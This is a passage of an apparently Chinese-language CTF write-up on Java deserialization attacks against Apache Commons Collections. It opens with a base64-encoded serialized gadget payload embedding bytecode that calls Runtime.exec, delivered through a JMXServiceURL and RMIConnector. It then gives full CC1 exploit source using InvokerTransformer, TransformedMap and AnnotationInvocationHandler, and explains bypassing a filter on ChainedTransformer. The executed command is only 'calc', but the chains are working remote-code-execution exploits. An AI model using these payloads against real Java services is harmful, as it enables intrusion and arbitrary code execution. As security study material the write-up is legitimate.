        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:iiop:///stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAF98r+ur4AAAA0ADUKAAkAJQoAJgAnCAAoCgAmACkHACoHACsKAAYALAcAKAcALQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGNhbGM7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAJY2FsYy5qYXZhDAAKAAsHAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAHAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAASAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAWAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAACgAJAA0ADAALAA0ADAAWAA4ADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJHB0AARhYWFhcHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANiYmJ4");
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());
        return rmiConnector;
    }
    public static void setField(Object o,String field,Object value) throws Exception{
        Field declaredField = o.getClass().getDeclaredField(field);
        declaredField.setAccessible(true);
        declaredField.set(o,value);
    }
    public static void serialize(Object o) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(o);
    }
    public static void unserialize() throws  Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("ser.bin"));
        objectInputStream.readObject();
    }
}
```

重链子尾部开始分析

```
尾部差不多都是利用InvokerTransformer#transform的方法，利用反射invoke触发
二次反序列化 rmiconnect的connect方法
所以我们的目的就是如何调用transform方法
```

`这里✌用的是TransformedMap这个类`

有一个checkSetvalue方法，

```java
protected final Transformer valueTransformer;
protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```



cc1原来的链子

```
readObject方法中setValue方法中的值为 AnnotationTypeMismatchExceptionProxy，不是我们想要的Runtime.class，所以在 transformers 中加入了 new ConstantTransformer(Runtime.class)，确保value值为我们的Runtime.class
```



```java
package cc1;
 
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
 
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
 
 
public class demo01 {
    public static void main(String[] args) throws Exception {
 
//        //正常获取runtime实例
//        Runtime runtime = Runtime.getRuntime();
 
//        //反射获取 runtime实例,并执行代码
//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime", null);
//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(runtime,"calc");
 
//        //InvokerTransformer方法获取runtime实例，并执行代码
//        Method  getRuntimeMethod = (Method) new InvokerTransformer("getRuntime", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime runtime = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);
 
        //通过ChainedTransformer实现 InvokerTransformer方法获取runtime实例，并执行代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);
 
 
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");
 
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
 

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //创建构造器
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        //保证可以访问到
        annotationInvocationHandlerConstructor.setAccessible(true);
        //实例化传参，注解和构造好的Map
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
 
        serialize(o);
        unserialize("ser.bin");
 
    }
 
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
 
    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

但是上面这个套路不太符合这道题，因为题目过滤了ChainedTransformer,但是我们又需要用到InvokerTransfomer、ConstantTransformer这俩个所以要想办法代替到ChainedTransformer

这里✌用的是双层嵌套

![image-20230926193851568](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230926193851568.png)

调试发现它再这里面循环了二次，也就是执行了二次setValue

![image-20230926194504001](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230926194504001.png)

发现是这里的return entry.setValue(value)还会执行一遍本方法；	

![image-20230926194849422](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230926194849422.png)

所以循环嵌套才是可以的，完美契合配上ConstTransfomer参数RM i也不会发生改变。

这个方法只能用于jdk8低版本 ，大概的范围再 65-120左右

因为高版本的就没这个setValue方法了导致调用不到后面的东西

![image-20230926200603584](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230926200603584.png)



撒花结束~~~只能说二种姿势都非常的巧妙。。。
